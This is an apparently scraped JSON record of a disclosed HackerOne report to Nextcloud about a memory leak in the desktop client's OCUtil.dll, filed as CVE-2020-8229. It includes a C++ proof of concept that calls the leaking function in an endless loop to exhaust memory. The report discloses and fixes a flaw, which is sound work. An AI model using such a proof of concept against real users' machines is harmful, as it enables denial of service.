@@ -1,0 +1,156 @@
+{
+  "id": 588562,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81ODg1NjI=",
+  "url": "https://hackerone.com/reports/588562",
+  "title": "Memory Leak in OCUtil.dll library in Desktop client can lead to DoS",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-05-23T12:44:35.917Z",
+  "submitted_at": "2019-05-23T12:44:35.917Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "cwave",
+    "url": "/cwave",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/r8w0u0wi37saeqr3mmt349o60hz0/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/hsgut1vi1cv8housqai9cm9383yx/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8229"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-08-06T13:56:55.155Z",
+  "bug_reporter_agreed_on_going_public_at": "2020-08-06T13:56:55.109Z",
+  "team_member_agreed_on_going_public_at": "2020-08-05T08:53:53.606Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The function IsChildFile(const wchar_t* rootFolder, const wchar_t* file) in FileUtil.cpp allocates memory on line 42 and fails to free it.\n\nThe following PoC code can provide evidence. The code and the PoC executable is attached to this report. Also OCUtils.dll and OCUtils_x64.dll library which is delivered with Nextclound Windows installer was included in the attachment.\n\nSteps to reproduce:\n1. Launch tests.exe (see attachment) or compile the attached VS2017 solution and launch the resulted executable\n2. Make sure OCUtil_x64 library is in the System library path\n3. Open Windows Task Manager and watch how the amount of memory for tests.exe process is increasing.\n\nA Visual Studio debugging session screenshot is also attached whre you can see the memory in use.\n\n#include \"pch.h\"\n#include <iostream>\n#include <windows.h>\n\ntypedef bool(__cdecl *f_IsChildFile)(const wchar_t* rootFolder, const wchar_t* file);\n\nint main()\n{\n\tHINSTANCE hGetProcIDDLL = LoadLibrary(L\"OCUtil_x64.dll\");\n\n\tif (!hGetProcIDDLL) {\n\t\tstd::cout << \"could not load the dynamic library\" << std::endl;\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tf_IsChildFile isChildFile = (f_IsChildFile)GetProcAddress(hGetProcIDDLL, \"?IsChildFile@FileUtil@@SA_NPEB_W0@Z\");\n\tif (!isChildFile) {\n\t\tstd::cout << \"could not locate the function\" << std::endl;\n\t\treturn EXIT_FAILURE;\n\t}\n\n\tstd::cout << \"Function is at \" << isChildFile;\n\n\tconst wchar_t * folder = L\"C:\\\\TestFolder\";\n\tconst wchar_t * file = L\"C:\\\\As they rounded a bend in the path that ran beside the river, Lara recognized the silhouette of a fig tree atop a nearby hill. The weather was hot and the days were long. The fig tree was in full leaf, but not yet bearing fruit. Soon Lara spotted other\";\n\n\tbool res; \n\n\twhile (1) {\n\t\tres = isChildFile(folder, file);\n\t\tstd::cout << res << \"\\n\";\n\t}\n\n\treturn 0;\n}\n\n## Impact\n\nMemory leaks have two common and sometimes overlapping causes:\n\n- Error conditions and other exceptional circumstances.\n\n- Confusion over which part of the program is responsible for freeing the memory.\n\nIn this case, the memory allocated in FileUtil.cpp at line 42 is not always freed or returned by the function.\n\nMost memory leaks result in general software reliability problems, but if an attacker can intentionally trigger a memory leak, the attacker may be able to launch a denial of service attack (by crashing the program) or take advantage of other unexpected program behavior resulting from a low memory condition \n\nThe function IsChildFile(const wchar_t* rootFolder, const wchar_t* file) is part of OCUtil.dll library which is delivered with Nextcloud Windows installer and it is loaded in explorer.exe process in order to provide context menu functionalities. \nBy using the context menu functionality multiple times, explorer.exe could pottentialy run out of memory.",
+  "bounty_amount": "100.0",
+  "formatted_bounty": "$100",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 495216,
+      "file_name": "VS_PoC.JPG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/495/216/8eea8008ef18834dd1869293bfdca351a913e3fc/VS_PoC.JPG?response-content-disposition=attachment%3B%20filename%3D%22VS_PoC.JPG%22%3B%20filename%2A%3DUTF-8%27%27VS_PoC.JPG&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVCEIVMPZ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T001036Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCNN%2FPkWk8ukfPPfsN4x0W4cBZCf1b%2BGRAGKbL4uuJo6gIgAa9w8a71115X%2FDHk%2BsKmNEU7MA2jEcla7P9hFrvt%2FksquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB8vYdxIVaCHHRfd2CqPBeN9wOXfgnyj%2BHIMbNhE7GEOyc0%2Fy89qH1%2F7Bl1dk8DDJfNOMMel%2F2IufpoXrHQO%2FY68QKg7RmtoCKcYFQ1W6xTrLt07gfZansBnhxAA0j9In4GHwr7%2BLsd%2BmZiw1U9giNuvywT%2BFPgMT%2FAOvDeBW6bjL3PSATulxQ9SmmcbTgizq1e7ihsTDe%2Bar%2Fvw3F1hky%2F7QLF2W4xnL5fy4XBl1LSHPPzFT7tqYGW%2F%2BMFsbldzauQSHhpLFyOG3RK8Rkx8OMSRr%2F4EHjRakCRojKQ3w32AL2P%2FI555%2FS%2FKUEZ%2FfbO3uJ0Ddv0PGGNyeZFp41M6X8oWWLwOH8LWriYEob6K%2B5%2BtaHbbYR67djoUF%2Bf8cW2DLd27MaO6rTkn4tiHmjs7ZDC7RQWmP7iDrAGXhdtNHokNspoPTAv295CW7lBO4NZMCwpfpFcnmxkdnDigRuMgNGNoer2ZSezunA25iKmCgR3iGONcRl%2Fn06rGrBCt1DkE42ITp8Pkk5D7Sf8WH89dfl9jkVyZZAyo6zWjq%2BCVuJeHlxHUzrqtgOFLyNp6nzVSjWcvsCLLUpEyZ3FrGtNc%2F1jdGtXikg5dF02Md8KQ5M1qF8ljQLT7y9waSOY%2F0PtCsqlgHqjHh8CrSeruIdITWsPTtLrybom2Afju9%2Fb5LxBQMSGjg%2BS9K7O3016BCCS0NDRh%2BVzOtDhZZQyDd2YBNrInNOcj6pVA89u8pLry%2FQ4p1egjAjH21dHruFo3WPVV1VCyiTKSpyHeKF3csws6XSSCQluK8jkrlHuzaflzFhb20%2B9QW633ZhEfOj86ynFYDmkEtr3VeDfeU9hQXQiGYunyh%2F0miVECGakbXYK2S3l5bpuXWk6O4qydWs27CUwwsN3jzAY6sQGPsyeP6amHCPTKaKVnhvGYhyoaDS2khVqYbLh7gsV0kcqYfCGAEm%2B4bmll3EgfDO2z%2FbcaDqymvJ3p7ombaounjv2QANRIYDpaowt0Ujh2H%2FaI%2FPI9HdoFuzAheveG42Z1KRtSqafE4uAFeH7Hhwy1zYHSO4PkRevclyQwJ4lHXs68PItRVIStfKrVMSFBU3qlQz6qRmO2GdAmoK0kP6NaSS0BLDW0C2pbLTRsGuqRQc0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=44170e7e604c12deea489bdab12bb87011b4fd6a6469a95736c230801f8cdd7e",
+      "file_size": 310194,
+      "type": "image/jpeg",
+      "moderated": null
+    },
+    {
+      "id": 495217,
+      "file_name": "nextcloud_memory_leak_poc.zip",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/495/217/bb581818d5e29a9d8ca8482ad04d23a400da42b7/nextcloud_memory_leak_poc.zip?response-content-disposition=attachment%3B%20filename%3D%22nextcloud_memory_leak_poc.zip%22%3B%20filename%2A%3DUTF-8%27%27nextcloud_memory_leak_poc.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVCEIVMPZ%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T001036Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENj%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCNN%2FPkWk8ukfPPfsN4x0W4cBZCf1b%2BGRAGKbL4uuJo6gIgAa9w8a71115X%2FDHk%2BsKmNEU7MA2jEcla7P9hFrvt%2FksquwUIof%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDB8vYdxIVaCHHRfd2CqPBeN9wOXfgnyj%2BHIMbNhE7GEOyc0%2Fy89qH1%2F7Bl1dk8DDJfNOMMel%2F2IufpoXrHQO%2FY68QKg7RmtoCKcYFQ1W6xTrLt07gfZansBnhxAA0j9In4GHwr7%2BLsd%2BmZiw1U9giNuvywT%2BFPgMT%2FAOvDeBW6bjL3PSATulxQ9SmmcbTgizq1e7ihsTDe%2Bar%2Fvw3F1hky%2F7QLF2W4xnL5fy4XBl1LSHPPzFT7tqYGW%2F%2BMFsbldzauQSHhpLFyOG3RK8Rkx8OMSRr%2F4EHjRakCRojKQ3w32AL2P%2FI555%2FS%2FKUEZ%2FfbO3uJ0Ddv0PGGNyeZFp41M6X8oWWLwOH8LWriYEob6K%2B5%2BtaHbbYR67djoUF%2Bf8cW2DLd27MaO6rTkn4tiHmjs7ZDC7RQWmP7iDrAGXhdtNHokNspoPTAv295CW7lBO4NZMCwpfpFcnmxkdnDigRuMgNGNoer2ZSezunA25iKmCgR3iGONcRl%2Fn06rGrBCt1DkE42ITp8Pkk5D7Sf8WH89dfl9jkVyZZAyo6zWjq%2BCVuJeHlxHUzrqtgOFLyNp6nzVSjWcvsCLLUpEyZ3FrGtNc%2F1jdGtXikg5dF02Md8KQ5M1qF8ljQLT7y9waSOY%2F0PtCsqlgHqjHh8CrSeruIdITWsPTtLrybom2Afju9%2Fb5LxBQMSGjg%2BS9K7O3016BCCS0NDRh%2BVzOtDhZZQyDd2YBNrInNOcj6pVA89u8pLry%2FQ4p1egjAjH21dHruFo3WPVV1VCyiTKSpyHeKF3csws6XSSCQluK8jkrlHuzaflzFhb20%2B9QW633ZhEfOj86ynFYDmkEtr3VeDfeU9hQXQiGYunyh%2F0miVECGakbXYK2S3l5bpuXWk6O4qydWs27CUwwsN3jzAY6sQGPsyeP6amHCPTKaKVnhvGYhyoaDS2khVqYbLh7gsV0kcqYfCGAEm%2B4bmll3EgfDO2z%2FbcaDqymvJ3p7ombaounjv2QANRIYDpaowt0Ujh2H%2FaI%2FPI9HdoFuzAheveG42Z1KRtSqafE4uAFeH7Hhwy1zYHSO4PkRevclyQwJ4lHXs68PItRVIStfKrVMSFBU3qlQz6qRmO2GdAmoK0kP6NaSS0BLDW0C2pbLTRsGuqRQc0%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5231f42288452f104d2fcddf632440f7c1bde997d279384470943e1914fc26fb",
+      "file_size": 930058,
+      "type": "application/zip",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-09-04T08:53:53.714Z",
+  "allow_singular_disclosure_after": -172423002.7570047,
+  "singular_disclosure_allowed": true,
+  "vote_count": 40,
+  "voters": [
+    "grimnir",
+    "xploiterr",
+    "mashoud1122",
+    "ali",
+    "sameerphad72",
+    "m00n_knight",
+    "khizer47",
+    "sa1tama0",
+    "bc6d19eb5e26e6e88426cca",
+    "butatree",
+    "and 30 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.9,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 77,
+    "asset_type": "DOWNLOADABLE_EXECUTABLES",
+    "asset_identifier": "Desktop Client",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
